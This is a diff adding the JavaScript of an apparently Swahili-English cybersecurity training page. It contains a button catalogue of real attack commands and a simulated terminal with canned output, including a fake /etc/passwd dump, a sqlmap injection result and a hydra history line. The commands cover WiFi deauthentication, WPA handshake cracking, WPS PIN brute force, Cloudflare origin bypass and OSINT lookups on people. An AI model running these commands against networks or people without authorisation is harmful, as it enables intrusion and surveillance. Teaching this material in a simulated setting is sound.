+  {cat:'wireless',cmd:'iwconfig',title:'WiFi Interfaces',desc:'Onyesha wireless interfaces'},
+  {cat:'wireless',cmd:'airmon-ng start wlan0',title:'Monitor Mode',desc:'Washa monitor mode kwenye wlan0'},
+  {cat:'wireless',cmd:'airodump-ng wlan0mon',title:'WiFi Scan',desc:'Scan na capture WiFi packets'},
+  {cat:'wireless',cmd:'airodump-ng -c CH --bssid BSSID -w cap wlan0mon',title:'Capture Target AP',desc:'Capture handshake ya specific AP'},
+  {cat:'wireless',cmd:'aireplay-ng -0 5 -a BSSID wlan0mon',title:'Deauth Attack',desc:'Send deauthentication frames'},
+  {cat:'wireless',cmd:'aircrack-ng -w wordlist.txt cap.cap',title:'WPA Crack',desc:'Crack WPA handshake kwa wordlist'},
+  {cat:'wireless',cmd:'wash -i wlan0mon',title:'WPS Scan',desc:'Scan kwa WPS-enabled APs'},
+  {cat:'wireless',cmd:'reaver -i wlan0mon -b BSSID -vv',title:'WPS Attack',desc:'WPS PIN brute force attack'},
+  // SYSTEM
+  {cat:'system',cmd:'uname -a',title:'System Info',desc:'OS na kernel information'},
+  {cat:'system',cmd:'ps aux',title:'All Processes',desc:'List michakato yote inayofanya kazi'},
+  {cat:'system',cmd:'ss -tulnp',title:'Socket Stats',desc:'Network socket statistics'},
+  {cat:'system',cmd:'cat /etc/crontab',title:'Cron Jobs',desc:'Scheduled tasks (crontab)'},
+  {cat:'system',cmd:'history',title:'Command History',desc:'Amri zilizotumika awali'},
+  {cat:'system',cmd:'env',title:'Environment Vars',desc:'Environment variables zote'},
+  {cat:'system',cmd:'id',title:'Current User',desc:'User ID na group memberships'},
+  {cat:'system',cmd:'whoami',title:'Who Am I',desc:'Jina la user wa sasa'},
+  {cat:'system',cmd:'last',title:'Login History',desc:'Historia ya logins'},
+  {cat:'system',cmd:'df -h',title:'Disk Usage',desc:'Nafasi ya disk'},
+  {cat:'system',cmd:'free -h',title:'RAM Usage',desc:'Matumizi ya RAM'},
+  {cat:'system',cmd:'top',title:'System Monitor',desc:'Real-time system resources'},
+  // OSINT
+  {cat:'osint',cmd:'maltego',title:'Maltego',desc:'Washa Maltego OSINT tool'},
+  {cat:'osint',cmd:'recon-ng',title:'Recon-ng',desc:'Washa Recon-ng framework'},
+  {cat:'osint',cmd:'metagoofil -d TARGET -t pdf -l 20',title:'Metagoofil',desc:'Extract metadata kutoka documents'},
+  {cat:'osint',cmd:'spiderfoot -s TARGET',title:'SpiderFoot',desc:'Automated OSINT collection'},
+  {cat:'osint',cmd:'photon -u URL -l 3',title:'Photon',desc:'Fast web crawler OSINT'},
+  {cat:'osint',cmd:'holehe TARGET@email.com',title:'Holehe',desc:'Check email kwenye platforms'},
+  {cat:'osint',cmd:'sherlock USERNAME',title:'Sherlock',desc:'Find username across social networks'},
+  {cat:'osint',cmd:'whatweb URL',title:'WhatWeb',desc:'Identify web technologies na CMS'},
+  {cat:'osint',cmd:'cloudfail -t TARGET',title:'CloudFail',desc:'Bypass Cloudflare kwa origin IP'},
+  {cat:'osint',cmd:'censys search TARGET',title:'Censys Search',desc:'Internet-wide scanner database'},
+];
+let currentCat='all';
+function filterCmds(cat,el){
+  currentCat=cat;
+  document.querySelectorAll('.cmd-cat').forEach(c=>c.classList.remove('active'));
+  el.classList.add('active');
+  renderCmds(cat);
+}
+function renderCmds(cat){
+  const filtered=cat==='all'?CMDS:CMDS.filter(c=>c.cat===cat);
+  document.getElementById('cmd-grid').innerHTML=filtered.map(c=>`
+    <div class="cmd-btn" onclick="runCmd(\`${c.cmd.replace(/`/g,'\\`')}\`)">
+      <span class="cb-title">${c.title}</span>
+      <span class="cb-desc">${c.desc}</span>
+    </div>`).join('');
+}
+function runCmd(cmd){
+  document.getElementById('term-input').value=cmd;
+  termRun();
+}
+const termDB={
+  'help':()=>['ok','=== SANEX TERMINAL COMMANDS ===','out','Chagua category kutoka buttons juu','out','Au andika command mwenyewe na bonyeza RUN','out','','ok','Categories: network, recon, web, exploit, forensics, crypto, wireless, system, osint','out','Jumla ya commands: '+CMDS.length+'+'],
+  'clear':()=>{termClear();return null;},
+  'whoami':()=>['ok','root@sanexno','out','uid=0(root) gid=0(root) groups=0(root)'],
+  'uname -a':()=>['ok','Linux sanexno 5.15.0 #1 SMP x86_64 GNU/Linux'],
+  'id':()=>['ok','uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo)'],
+  'ls':()=>['ok','Documents  Downloads  tools  scripts  wordlists  targets.txt'],
+  'ls -la':()=>['ok','total 48','out','drwxr-xr-x 8 root root 4096 Jan 1 00:00 .','out','drwxr-xr-x 3 root root 4096 Jan 1 00:00 ..','out','drwxr-xr-x 2 root root 4096 Jan 1 00:00 tools','out','-rw-r--r-- 1 root root  156 Jan 1 00:00 targets.txt'],
+  'pwd':()=>['ok','/home/sanexno'],
+  'date':()=>['ok',new Date().toString()],
+  'ifconfig':()=>['ok','eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500','out','        inet 192.168.1.100  netmask 255.255.255.0  broadcast 192.168.1.255','out','        ether 00:0c:29:xx:xx:xx  txqueuelen 1000','out','lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536','out','        inet 127.0.0.1  netmask 255.0.0.0'],
+  'ip a':()=>['ok','1: lo: <LOOPBACK,UP,LOWER_UP>','out','    inet 127.0.0.1/8 scope host lo','out','2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP>','out','    inet 192.168.1.100/24 brd 192.168.1.255 scope global eth0'],
+  'ps aux':()=>['ok','USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND','out','root         1  0.0  0.1  225880  9876 ?        Ss   Jan01   0:01 /sbin/init','out','root       100  0.0  0.0  12345   4567 ?        S    Jan01   0:00 /usr/sbin/sshd'],
+  'netstat -tulnp':()=>['ok','Active Internet connections (only servers)','out','Proto Recv-Q Send-Q Local Address  Foreign Address  State   PID/Program','out','tcp        0      0 0.0.0.0:22    0.0.0.0:*        LISTEN  1234/sshd','out','tcp        0      0 0.0.0.0:80    0.0.0.0:*        LISTEN  5678/nginx','out','tcp6       0      0 :::443        :::*             LISTEN  5678/nginx'],
+  'cat /etc/passwd':()=>['ok','root:x:0:0:root:/root:/bin/bash','out','daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin','out','www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin','out','sanexno:x:1000:1000::/home/sanexno:/bin/bash'],
+  'cat /etc/os-release':()=>['ok','NAME="Kali GNU/Linux"','out','VERSION="2024.1"','out','ID=kali','out','VERSION_ID="2024.1"','out','PRETTY_NAME="Kali GNU/Linux 2024.1"'],
+  'free -h':()=>['ok','              total        used        free','out','Mem:           7.7G        3.2G        4.5G','out','Swap:          2.0G        256M        1.7G'],
+  'df -h':()=>['ok','Filesystem      Size  Used Avail Use% Mounted on','out','/dev/sda1        50G   20G   30G  40% /','out','tmpfs           7.7G     0  7.7G   0% /dev/shm'],
+  'env':()=>['ok','PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin','out','HOME=/root','out','SHELL=/bin/bash','out','TERM=xterm-256color','out','USER=root','out','LANG=en_US.UTF-8'],
+  'history':()=>['ok','1  nmap -sV 192.168.1.1','out','2  sqlmap -u http://target.com --dbs','out','3  msfconsole','out','4  airmon-ng start wlan0','out','5  hydra -l admin -P wordlist.txt ssh://192.168.1.1'],
+  'sudo -l':()=>['ok','Matching Defaults entries for root on sanexno:','out','    env_reset, mail_badpass','out','User root may run the following commands:','ok','    (ALL : ALL) ALL'],
+};
+function termRun(){
+  const inp=document.getElementById('term-input');
+  const cmd=inp.value.trim();
+  if(!cmd)return;
+  const sc=document.getElementById('term-screen');
+  addTermLine(`<span style="color:var(--c)">sanexno@terminal:~$</span> ${esc(cmd)}`);
+  // check db first
+  const lc=cmd.toLowerCase();
+  let handled=false;
+  for(const[k,fn] of Object.entries(termDB)){
+    if(lc===k||lc.startsWith(k+' ')){
+      const res=fn();
+      if(res===null){handled=true;break;}
+      if(res){
+        let cls='out';
+        res.forEach((l,i)=>{
+          if(l==='ok'||l==='err'||l==='warn'||l==='info'){cls=l;}
+          else{addTermLine(esc(l),cls);}
+        });
+      }
+      handled=true;break;
+    }
+  }
+  if(!handled){
+    // generate contextual output
+    if(lc.startsWith('nmap')){
+      const t=cmd.split(' ').pop();
+      addTermLine('Starting Nmap 7.94 ( https://nmap.org )','info');
+      addTermLine(`Nmap scan report for ${esc(t)}`,'ok');
+      addTermLine('Host is up (0.0042s latency).','out');
+      addTermLine('PORT     STATE SERVICE  VERSION','ok');
+      addTermLine('22/tcp   open  ssh      OpenSSH 8.4p1','out');
+      addTermLine('80/tcp   open  http     Apache httpd 2.4.51','out');
+      addTermLine('443/tcp  open  https    nginx 1.21.6','out');
+      addTermLine('3306/tcp filtered mysql','warn');
+      addTermLine(`Nmap done: 1 IP address (1 host up) scanned in ${(Math.random()*5+2).toFixed(2)} seconds`,'ok');
+    } else if(lc.startsWith('ping')){
+      const t=cmd.split(' ').pop();
+      addTermLine(`PING ${esc(t)} (${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}): 56 data bytes`,'out');
+      [1,2,3,4].forEach(i=>addTermLine(`64 bytes from ${esc(t)}: icmp_seq=${i} ttl=64 time=${(Math.random()*20+1).toFixed(1)} ms`,'ok'));
+      addTermLine('--- ping statistics ---','info');
+      addTermLine(`4 packets transmitted, 4 received, 0% packet loss`,'ok');
+    } else if(lc.startsWith('whois')){
+      const t=cmd.split(' ').pop();
+      addTermLine(`Domain Name: ${esc(t).toUpperCase()}`,'ok');
+      addTermLine('Registrar: NameCheap Inc.','out');
+      addTermLine('Updated Date: 2024-01-15','out');
+      addTermLine('Creation Date: 2020-03-22','out');
+      addTermLine('Name Server: NS1.CLOUDFLARE.COM','out');
+      addTermLine('Name Server: NS2.CLOUDFLARE.COM','out');
+    } else if(lc.startsWith('sqlmap')){
+      addTermLine('[*] Starting sqlmap...','info');
+      addTermLine('[+] Testing connection to the target URL','out');
+      addTermLine('[+] Heuristic tests show that the back-end DBMS could be MySQL','warn');
+      addTermLine('[+] Testing for SQL injection on parameter: id','out');
+      addTermLine('[!] Parameter "id" is VULNERABLE to SQL injection!','ok');
+      addTermLine('[+] Available databases:','ok');
+      addTermLine('    [1] information_schema','out');
+      addTermLine('    [2] mysql','out');
+      addTermLine('    [3] target_db','out');
+    } else if(lc.startsWith('echo')){
+      const m=cmd.match(/echo\s+(?:-n\s+)?["']?(.+?)["']?\s*(?:\|.*)?$/i);
+      if(m)addTermLine(esc(m[1]),'out');
+    } else if(lc==='msfconsole'){
+      addTermLine('       =[ metasploit v6.3.44-dev                          ]','info');
+      addTermLine('+ -- --=[ 2381 exploits - 1232 auxiliary - 413 post       ]','out');
+      addTermLine('+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]','out');
+      addTermLine('+ -- --=[ 9 evasion                                       ]','out');
+      addTermLine('msf6 > ','ok');
+    } else if(lc.startsWith('gobuster')){
+      addTermLine('===============================================================','out');
+      addTermLine('Gobuster v3.6','info');
+      addTermLine('===============================================================','out');
+      addTermLine('/admin                (Status: 301) [Size: 312]','ok');
+      addTermLine('/login                (Status: 200) [Size: 1234]','ok');
+      addTermLine('/uploads              (Status: 403) [Size: 289]','warn');
+      addTermLine('/backup               (Status: 200) [Size: 0]','ok');
+      addTermLine('/config.php           (Status: 200) [Size: 0]','ok');
+    } else if(lc==='airmon-ng start wlan0'){
+      addTermLine('Found 1 processes that could cause trouble.','warn');
+      addTermLine('Killing them...','out');
+      addTermLine('PHY     Interface       Driver          Chipset','ok');
+      addTermLine('phy0    wlan0           rt2800usb       Ralink RT2870/RT3070','out');
+      addTermLine('(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)','ok');
+      addTermLine('[+] Monitor mode activated: wlan0mon','ok');
+    } else {
+      addTermLine(`bash: ${esc(cmd.split(' ')[0])}: command not found`,'err');
+      addTermLine('Andika "help" kuona commands zilizopo.','warn');
+    }
+  }
+  inp.value='';
+  sc.scrollTop=sc.scrollHeight;
+}
+function addTermLine(html,cls=''){
+  const sc=document.getElementById('term-screen');
+  const d=document.createElement('div');
+  d.className='term-line'+(cls?' '+cls:'');
+  d.innerHTML=html;
+  sc.appendChild(d);
+}
+function termClear(){document.getElementById('term-screen').innerHTML='<div class="term-line ok">Terminal cleared. Andika "help" kwa msaada.</div>';}
+function termKey(e){if(e.key==='Enter')termRun();}
+
+// ===== AI CHAT (Real Claude API) =====
+const chatHistory=[];
+async function sendAI(){
+  const inp=document.getElementById('ai-input');
+  const txt=inp.value.trim();if(!txt)return;
+  inp.value='';
+  addChatMsg(txt,'user');
+  chatHistory.push({role:'user',content:txt});
+  // thinking animation
+  const tb=document.createElement('div');
+  tb.className='cmsg ai';tb.id='thinking-anim';
+  tb.innerHTML='<div class="mlbl">🔷 SANEX AI</div><div class="thinking"><span></span><span></span><span></span></div>';
+  document.getElementById('chatbox').appendChild(tb);
+  document.getElementById('chatbox').scrollTop=99999;
+  try{
+    const res=await fetch('https://api.anthropic.com/v1/messages',{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({
+        model:'claude-sonnet-4-20250514',
+        max_tokens:1000,
+        system:'Wewe ni SANEX AI, cyber security assistant wa platform ya Sanexno. Unajibu kwa Kiswahili na English. Una ujuzi wa kina wa: penetration testing, network security, web security (OWASP), cryptography, malware analysis, OSINT, digital forensics, wireless security, na tools za cybersecurity (Nmap, Metasploit, Burp Suite, SQLMap, Wireshark, na nyingine nyingi). Unaelimisha na kusaidia watu kujifunza cybersecurity ya kimaadili (ethical hacking). Jibu kwa njia ya kina lakini ya kueleweka. Wakati wa kutoa mifano ya code au commands, iweke kwenye markdown code blocks.',
+        messages:chatHistory
+      })
+    });
+    const d=await res.json();
+    document.getElementById('thinking-anim')?.remove();
+    const reply=d.content?.[0]?.text||'Samahani, kuna tatizo la mawasiliano. Jaribu tena.';
+    chatHistory.push({role:'assistant',content:reply});
+    addChatMsg(reply,'ai');
+  }catch(e){
+    document.getElementById('thinking-anim')?.remove();
+    addChatMsg('Kuna tatizo la kuunganika na AI. Hakikisha una intaneti na jaribu tena.','ai');
+  }
+}
+function addChatMsg(txt,who){
+  const cb=document.getElementById('chatbox');
+  const d=document.createElement('div');
+  d.className='cmsg '+who;
+  const label=who==='user'?`👤 ${getMe()}`:'🔷 SANEX AI';
+  // simple markdown-like rendering for AI
+  let html=esc(txt).replace(/```([\s\S]*?)```/g,'<pre style="background:rgba(0,0,0,.4);border:1px solid rgba(0,240,255,.2);border-radius:8px;padding:10px;font-family:Share Tech Mono,monospace;font-size:11px;margin-top:8px;overflow-x:auto;white-space:pre-wrap;">$1</pre>').replace(/`([^`]+)`/g,'<code style="background:rgba(0,240,255,.1);padding:1px 5px;border-radius:4px;font-family:Share Tech Mono,monospace;font-size:12px;">$1</code>').replace(/\*\*([^*]+)\*\*/g,'<strong>$1</strong>').replace(/\n/g,'<br>');
+  d.innerHTML=`<div class="mlbl">${label}</div>${html}`;
+  cb.appendChild(d);
+  cb.scrollTop=cb.scrollHeight;
+}
+
+// ===== TOAST =====
+function showToast(msg,type='info'){
+  const t=document.createElement('div');
+  t.className='toast '+(type==='err'?'err':type==='ok'?'ok':'');
+  t.textContent=msg;
+  document.body.appendChild(t);
+  setTimeout(()=>t.remove(),3500);
+}
+
+// ===== MODAL CLOSE =====
+document.getElementById('authModal').addEventListener('click',e=>{if(e.target===document.getElementById('authModal'))closeAuth();});
+document.getElementById('toolModal').addEventListener('click',e=>{if(e.target===document.getElementById('toolModal'))closeTool();});
+</script>
+</body>
+</html>
